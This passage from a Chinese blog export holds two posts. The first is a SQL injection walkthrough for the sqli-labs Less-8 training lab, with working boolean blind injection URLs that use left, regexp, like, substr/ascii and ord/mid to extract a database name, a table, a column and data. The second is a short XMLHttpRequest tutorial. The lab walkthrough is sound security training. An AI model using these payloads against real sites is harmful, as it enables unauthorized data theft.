<p>以此类推到最后一个<br>结果就出来了</p>
<h3 id="like函数"><a href="#like函数" class="headerlink" title="like函数"></a>like函数</h3><p>就不多说了</p>
<h4 id="进行注入"><a href="#进行注入" class="headerlink" title="进行注入"></a>进行注入</h4><p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200805162204658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="substr-函数和ascii-函数"><a href="#substr-函数和ascii-函数" class="headerlink" title="substr()函数和ascii()函数"></a>substr()函数和ascii()函数</h3><p><strong>数据库名称dvwa</strong><br>下面这个我用的是 database()查询当前数据库的，<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020080515284435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ol>
<li>substr()函数是截取字符串的<br>看一下代码<code>select substr(&#39;abcdefc&#39;,1,4);</code><br>意思就是从第1个开始取到第4个<br>结果<img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200810120447390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>ascii()就是把字符串转化成ascii码<br>用这个点原因是避免了<code>&#39;</code>的出现<img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200810120716917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><h4 id="报错查询"><a href="#报错查询" class="headerlink" title="报错查询"></a>报错查询</h4>代码<code> select ascii(substr((select database()),1,1))=100;</code><br>查询的是dvwa库第一个字符是d的ascii等于100<br>结果是100<img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200810121650984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ol>
<h3 id="ord-函数和mid-函数"><a href="#ord-函数和mid-函数" class="headerlink" title="ord()函数和mid()函数"></a>ord()函数和mid()函数</h3><ol>
<li>ord()和上面的ascii()是一样的<br>就是把字符串转化成ascii码<br>用这个点原因是避免了<code>&#39;</code>的出现<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200810122414136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>mid()和上面的substr()函数是一样的<br>意思就是从第1个开始取到第4个<img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200810122656263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ol>
<h4 id="报错查询-1"><a href="#报错查询-1" class="headerlink" title="报错查询"></a>报错查询</h4><p>其实和上面的一样<br>代码<code>select ord(mid((select database()),1,1))=100;</code><br>查询的是dvwa库第一个字符是d的ascii等于100<br>结果是100<img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200810122857937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>第8关</p>
<h3 id="1-判断是否存在sql注入漏洞"><a href="#1-判断是否存在sql注入漏洞" class="headerlink" title="1.判断是否存在sql注入漏洞"></a>1.判断是否存在sql注入漏洞</h3><p>输入<code>http://192.168.0.102/Less-8/?id=1</code><br>显示出<strong>You are in………..</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813110150938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>添加一个<code>&#39;</code><br>输入<code>http://192.168.0.102/Less-8/?id=1&#39;</code><br>发现没有任何显示，可能存在sql注入漏洞<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020081311100965.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>在进行判断<br>输入<code>http://192.168.0.102/Less-8/?id=1 &#39; and &#39;1&#39;=&#39;1</code><br>发现正常显示</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813111203293.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入<code>http://192.168.0.102/Less-8/?id=1 &#39; and &#39;1&#39;=&#39;2</code></p>
<p>报错<br>说明是存在sql注入漏洞的</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813111704607.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="2-读取数据"><a href="#2-读取数据" class="headerlink" title="2.  读取数据"></a>2.  读取数据</h3><p>发现他就两个结果，一个正确是输出，一个是错误不输出<br>我们就可以进行布尔盲注、<br>查询其他的比较麻烦这个我就查询当前的库的数据</p>
<ol>
<li>查询当前的库名</li>
</ol>
<p><strong>下面演示的事left函数进行查询的</strong></p>
<p>URL地址<code>http://192.168.0.102/Less-8/?id=1&#39; and left(database(),1)=&#39;s&#39; --+</code><br>结果是s<br>输入a没有显示没有显示<img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813121603775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入s都显示了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020081312253892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>查询第二个</strong><br>URL地址<code>http://192.168.0.102/Less-8/?id=1&#39; and left(database(),2)=&#39;se‘ --+</code><br>结果是e<br>输入a没有显示<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813122356678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>输入e显示了说明就是e<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813122341294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>还可以用burp进行查询方便<br>直接就可以查询出来<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813123547241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>其他函数查询方法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">regexp函数</span><br><span class="line">http://192.168.0.102/Less-8/?id=1&#x27; and  database()  regexp &#x27;^s&#x27; <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">like函数</span><br><span class="line">http://192.168.0.102/Less-8/?id=1&#x27; and  database()  like &#x27;d%&#x27; <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">substr()函数和ascii()函数	</span><br><span class="line">http://192.168.0.102/Less-8/?id=1&#x27; and  ascii(substr((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>  <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ord</span>()函数和<span class="keyword">mid</span>()函数</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.0</span><span class="number">.102</span>/<span class="keyword">Less</span><span class="number">-8</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27; and  ord(mid((select database()),1,1))=115  --+ </span></span><br></pre></td></tr></table></figure>

<p>以此类推找到数据库名是<code>security</code>其他的库就不查询</p>
<ol start="2">
<li>查询表<br>上面已经叫库明查询出来了</li>
</ol>
<p><strong>下面演示的事left函数进行查询的</strong><br>URL地址<code>http://192.168.0.102/Less-8/ ?id=1&#39; and left((select table_name from information_schema.tables where table_schema=&#39;security&#39; LIMIT 0,1) ,1)=&#39;e&#39; --+  </code><br>结果是e<br>输入a没有显示<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813130513707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入e就显示了说明第一个字符是e</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813130458144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>查询第二个</strong><br>URL地址<code>http://192.168.0.102/Less-8/ ?id=1&#39; and left((select table_name from information_schema.tables where table_schema=&#39;security&#39; LIMIT 0,1) ,2)=&#39;ea&#39; --+ </code><br>结果是m<br>输入a没有显示<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813130704167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入m就显示了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020081313081453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>用burp进行查询提升速度<br>是a<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813131304868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>其他函数查询</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">regexp函数</span><br><span class="line">http://192.168.0.102/Less-8/?id=1&#x27; and (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>)  regexp <span class="string">&#x27;^e&#x27;</span> <span class="comment">--+查询到emails</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">like</span>函数</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.0</span><span class="number">.102</span>/<span class="keyword">Less</span><span class="number">-8</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27; and  (select table_name from information_schema.tables where table_schema=&#x27;</span><span class="keyword">security</span><span class="string">&#x27; LIMIT 0,1)  like &#x27;</span>e%<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">substr()函数和ascii()函数	</span></span><br><span class="line"><span class="string">http://192.168.0.102/Less-8/?id=1&#x27;</span> <span class="keyword">and</span>  <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;security&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>) ,<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span>  <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ord</span>()函数和<span class="keyword">mid</span>()函数</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.0</span><span class="number">.102</span>/<span class="keyword">Less</span><span class="number">-8</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27; and  ord(mid((select table_name from information_schema.tables where table_schema=&#x27;</span><span class="keyword">security</span><span class="string">&#x27; LIMIT 0,1),1,1))=101  --+ </span></span><br></pre></td></tr></table></figure>
<p>以此类推叫第一个给查询出来了<code>emails</code>其他的表就不查询<br>3. 查询列<br>上面我已经第一个给查询出来了<code>emails</code> 利用这个查询列<br><strong>下面演示的事left函数进行查询的</strong><br>URL地址<code>http://192.168.0.102/Less-8/?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;emails&#39; LIMIT 0,1),1)=&#39;i&#39; --+ </code><br>结果是i<br>输入a没有显示<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813132839338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入i就显示了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813133035958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查询第二个字符<br>URL地址<code>http://192.168.0.102/Less-8/?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;emails&#39; LIMIT 0,1),2)=&#39;id&#39; --+</code><br>结果是d<br>输入a没有显示<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813133124609.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入d显示了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813133221111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>用burp就不演示了<br>其他函数查询方法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">regexp函数</span><br><span class="line">http://192.168.0.102/Less-8/?id=1&#x27; and  (<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;emails&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>)  regexp <span class="string">&#x27;^i&#x27;</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">like</span>函数</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.0</span><span class="number">.102</span>/<span class="keyword">Less</span><span class="number">-8</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27; and  (select column_name from information_schema.columns where table_name=&#x27;</span>emails<span class="string">&#x27; LIMIT 0,1)  like &#x27;</span>i%<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">substr()函数和ascii()函数	</span></span><br><span class="line"><span class="string">http://192.168.0.102/Less-8/?id=1&#x27;</span> <span class="keyword">and</span>  <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;emails&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">105</span>  <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ord</span>()函数和<span class="keyword">mid</span>()函数</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.0</span><span class="number">.102</span>/<span class="keyword">Less</span><span class="number">-8</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27; and  ord(mid((select column_name from information_schema.columns where table_name=&#x27;</span>emails<span class="string">&#x27; LIMIT 0,1),1,1))=105  --+ </span></span><br></pre></td></tr></table></figure>
<p>查询出来了第一个列是<code>id</code>其他的列就不查询<br>4. 查询数据内容<br>通过上面的查询知道了库明，表明，列明<br>就可以查询数据了<br>URL地址<code>http://192.168.0.102/Less-8/?id=1&#39; and left((select id from security.emails LIMIT 0,1 ),1)=&#39;2&#39; --+ </code><br>结果是1<br>输入2没有显示<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813134431665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>输入1显示了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200813134551222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>其他函数查询方法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">regexp函数</span><br><span class="line">http://192.168.0.102/Less-8/?id=1&#x27; and  (<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> security.emails <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span> )  regexp <span class="string">&#x27;^1&#x27;</span> <span class="comment">--+ </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">like</span>函数</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.0</span><span class="number">.102</span>/<span class="keyword">Less</span><span class="number">-8</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27; and  (select id from security.emails LIMIT 0,1 )  like &#x27;</span><span class="number">1</span>%<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">substr()函数和ascii()函数	</span></span><br><span class="line"><span class="string">http://192.168.0.102/Less-8/?id=1&#x27;</span> <span class="keyword">and</span>  <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> security.emails <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span> ),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">49</span>  <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ord</span>()函数和<span class="keyword">mid</span>()函数</span><br><span class="line"><span class="keyword">http</span>://<span class="number">192.168</span><span class="number">.0</span><span class="number">.102</span>/<span class="keyword">Less</span><span class="number">-8</span>/?<span class="keyword">id</span>=<span class="number">1</span><span class="string">&#x27; and  ord(mid((select id from security.emails LIMIT 0,1 ) ,1,1))=49  --+ </span></span><br></pre></td></tr></table></figure>
<p>数据库内容是结果是1</p>
<p><strong>这样查询非常麻烦</strong></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>4.JavaScript的XMLHttpRequest使用</title>
    <url>/2020/12/08/4.JavaScript%E7%9A%84XMLHttpRequest%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="什么是XMLHttpRequest"><a href="#什么是XMLHttpRequest" class="headerlink" title="什么是XMLHttpRequest"></a>什么是XMLHttpRequest</h2><p>XMLHttpRequest 对象用于同幕后服务器交换数据。这意味着可以更新网页的部分，而不需要重新加载整个页面。</p>
<p>XMLHttpRequest他是用http实现的通信</p>
<h2 id="XMLHttpRequest的方法"><a href="#XMLHttpRequest的方法" class="headerlink" title="XMLHttpRequest的方法"></a>XMLHttpRequest的方法</h2><table>
<thead>
<tr>
<th align="center">方法</th>
<th align="right">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>open(&quot;请求类型&quot;,&quot;URL&quot;)</code></td>
<td align="right">请求类型 GET 或 POST，url：文件位置</td>
</tr>
<tr>
<td align="center"><code>send()</code></td>
<td align="right">将请求发送到服务器，用于 GET 请求</td>
</tr>
<tr>
<td align="center"><code>send(&quot;数据内容&quot;)</code></td>
<td align="right">将请求发送到服务器，用于 POST 请求</td>
</tr>
<tr>
<td align="center"><code>abort()</code></td>
<td align="right">取消当前请求</td>
</tr>
<tr>
<td align="center"><code>getAllResponseHeaders()</code></td>
<td align="right">返回头部信息</td>
</tr>
<tr>
<td align="center"><code>getResponseHeader()</code></td>
<td align="right">返回特定的头部信息</td>
</tr>
<tr>
<td align="center"><code>setRequestHeader()</code></td>
<td align="right">向要发送的报头添加标签/值对</td>
</tr>
</tbody></table>
<h2 id="XMLHttpRequest的属性"><a href="#XMLHttpRequest的属性" class="headerlink" title="XMLHttpRequest的属性"></a>XMLHttpRequest的属性</h2><table>
<thead>
<tr>
<th align="center">方法</th>
<th align="right">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>readyState</code></td>
<td align="right">0：请求未初始化1：服务器连接已建立2：请求已收到3：正在处理请求4：请求已完成且响应已就绪</td>
</tr>
<tr>
<td align="center"><code>responseText</code></td>
<td align="right">返回响应数据以字符串格式显示</td>
</tr>
<tr>
<td align="center"><code>responseXML</code></td>
<td align="right">以 XML 数据返回响应数据</td>
</tr>
<tr>
<td align="center"><code>status</code></td>
<td align="right">返回请求的状态号 200: “OK”，403: “Forbidden” ，404: “Not Found”</td>
</tr>
<tr>
<td align="center"><code>statusText</code></td>
<td align="right">返回状态文本（比如 “OK” 或 “Not Found”）</td>
</tr>
</tbody></table>
<h2 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h2><p><strong>下面我用到的</strong></p>
<table>
<thead>
<tr>
<th align="center">方法</th>
<th align="right">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>open(&quot;请求类型&quot;,&quot;URL&quot;)</code></td>
<td align="right">请求类型 GET 或 POST，url：文件位置</td>
</tr>
<tr>
<td align="center"><code>send()</code></td>
<td align="right">将请求发送到服务器，用于 GET 请求</td>
</tr>
<tr>
<td align="center"><code>send(string)</code></td>
<td align="right">将请求发送到服务器，用于 POST 请求</td>
</tr>
<tr>
<td align="center"><code>setRequestHeader()</code></td>
<td align="right">向要发送的报头添加键名/值</td>
</tr>
</tbody></table>
<h3 id="创建XMLHttpRequest对象"><a href="#创建XMLHttpRequest对象" class="headerlink" title="创建XMLHttpRequest对象"></a>创建XMLHttpRequest对象</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> XMLHttpRequest();</span><br></pre></td></tr></table></figure>
<h3 id="创建请求行"><a href="#创建请求行" class="headerlink" title="创建请求行"></a>创建请求行</h3><p>创建请求行用的方法是<code>open()</code></p>
<p>第一个猜数请求类型 GET 或 POST<br>第二个猜数url：文件位置 </p>
<h4 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h4><p>如果要添加参数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;a.php?username=admin&amp;password=admin&quot;</span>);  </span><br></pre></td></tr></table></figure>
<h4 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a.open(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;a.php&quot;</span>);  </span><br></pre></td></tr></table></figure>
<h3 id="添加请求头"><a href="#添加请求头" class="headerlink" title="添加请求头"></a>添加请求头</h3><p>向要发送的报头用到<code>setRequestHeader()</code>方法<br>里面可以随便改<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201207084205.png"></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a.setRequestHeader(<span class="string">&quot;头键名&quot;</span>,<span class="string">&quot;头值&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>实咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="javascript">	<span class="comment">//创建XMLHttpRequest对象</span></span></span><br><span class="line"><span class="javascript">	<span class="keyword">var</span> a = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line">	</span><br><span class="line"><span class="javascript">	<span class="comment">//创建请求行</span></span></span><br><span class="line"><span class="javascript">	a.open(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;a.php&quot;</span>);</span></span><br><span class="line">	</span><br><span class="line"><span class="javascript">	<span class="comment">//添加请求头</span></span></span><br><span class="line"><span class="javascript">	a.setRequestHeader(<span class="string">&quot;aaaaa&quot;</span>,<span class="string">&quot;bbbbbb&quot;</span>);</span></span><br><span class="line"><span class="javascript">	<span class="comment">//将请求发送到服务器</span></span></span><br><span class="line">	a.send();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201207084413.png"></p>
<h3 id="将请求发送到服务器"><a href="#将请求发送到服务器" class="headerlink" title="将请求发送到服务器"></a>将请求发送到服务器</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a.send(); <span class="comment">//里面没有参数发送的是GET请求</span></span><br><span class="line">a.send(<span class="string">&quot;username=admin&amp;password=admin&quot;</span>); <span class="comment">//这个就是POST的数据内容</span></span><br></pre></td></tr></table></figure>
<h3 id="实咧测试"><a href="#实咧测试" class="headerlink" title="实咧测试"></a>实咧测试</h3><p>代码</p>
